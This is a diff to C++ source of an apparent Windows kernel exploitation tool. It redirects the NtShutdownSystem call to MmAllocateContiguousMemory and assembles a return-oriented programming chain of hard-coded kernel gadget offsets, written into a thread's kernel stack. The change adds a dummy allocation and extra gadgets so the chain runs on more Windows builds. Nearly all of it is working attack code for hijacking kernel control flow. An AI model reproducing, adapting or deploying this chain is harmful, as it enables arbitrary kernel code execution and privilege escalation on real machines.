@@ -30,6 +30,7 @@ int main()
     //    (void*)(Driver::GetKernelModuleBase() + 0x345F40)
     //);
     KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
+    void* DummyMemoryAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
     void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
@@ -120,9 +121,22 @@ int main()
 
 
     // Write our own stack into thread's legitimate stack
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+
+    // TODO: Fix this padding, this will crash sometimes if not uncommented, should be done automatically!
+    // r9=rax, IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
+    // if yours includes it, then you must account for the padding, uncomment the line below.
+    KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
+    // KernelStackManager.AddPadding(0x28);
+
+    // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
+    // to a valid memory dummy pool so that it writes there.
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
+    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
+
+
     KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
     KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
